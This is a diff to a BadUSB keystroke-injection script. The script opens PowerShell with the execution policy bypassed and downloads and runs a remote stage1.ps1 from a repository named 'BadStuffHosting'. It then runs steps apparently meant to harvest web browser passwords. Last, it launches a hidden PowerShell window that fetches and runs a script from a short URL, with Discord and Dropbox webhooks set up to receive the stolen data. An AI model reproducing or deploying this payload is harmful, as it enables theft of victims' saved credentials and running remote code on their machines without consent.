@@ -21,7 +21,11 @@ REM                Y8b d88P          888
 REM                 "Y88P"           888                                                           
 REM ______________________________________________________________________________________________
 REM
-REM Usage : Put your discord webhook into $dc | put your dopbox webhook into $db
+REM
+REM !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+REM Usage : Put your discord webhook into $dc | put your dopbox webhook into $db |
+REM The variables are at the end of this BadUSB script
+REM !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 REM
 DELAY 2000
 GUI r
@@ -29,11 +33,12 @@ DELAY 1000
 STRING powershell -NoP -Ep Bypass
 ENTER
 DELAY 1000
-STRING $dc= '' ; $db= ''
-ENTER
-STRING irm https://shorturl.at/rLQS5
+STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Gvte-Kali/BadStuffHosting/main/BadUSB/W1ns1d3r/W1ns1d3r_st4gg3d/stage1.ps1'))
 ENTER
 DELAY 1000
+STRING TempDir
+ENTER
+DELAY 300
 STRING Get-Nirsoft
 ENTER
 DELAY 8000
@@ -49,3 +54,6 @@ STRING w3b_br0ws3r_p4ssw0rds
 ENTER
 DELAY 1000
 ALT F4
+DELAY 1000
+STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://shorturl.at/rLQS5 | iex
+ENTER
